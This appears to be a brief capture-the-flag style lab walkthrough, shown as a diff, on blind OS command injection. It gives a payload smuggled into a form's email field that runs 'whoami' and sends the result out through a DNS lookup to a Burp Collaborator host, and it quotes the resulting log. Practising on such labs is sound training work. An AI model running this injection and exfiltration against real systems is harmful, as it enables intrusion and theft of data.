@@ -1,0 +1,15 @@
+Blind OS command injection with out-of-band data exfiltration
+
+Stepping up from our previous challenge, we shall not attempt to exfiltrate some data.
+
+Submit a feedback form with some random data, send it to repeater. Fire up Collaborator.
+
+We will simply add a "whoami" command to our previous payload.
+New payload:
+
+email=||nslookup+`whoami`.re9iwatvfhds8638oqyb58hz8qeh26.burpcollaborator.net||
+
+Replace the email parameter with the new on in Repeater and hit send. Now check your Collaborator, you should have a DNS request that looks like this:
+The Collaborator server received a DNS lookup of type AAAA for the domain name peter-cfQlB8.re9iwatvfhds8638oqyb58hz8qeh26.burpcollaborator.net.  The lookup was received from IP address 34.245.205.166 at 2020-May-13 13:31:44 UTC.
+
+The username is everything up to the first dot. peter-cfQlB8 in this case. Submit the answer and pat yourself on the back.
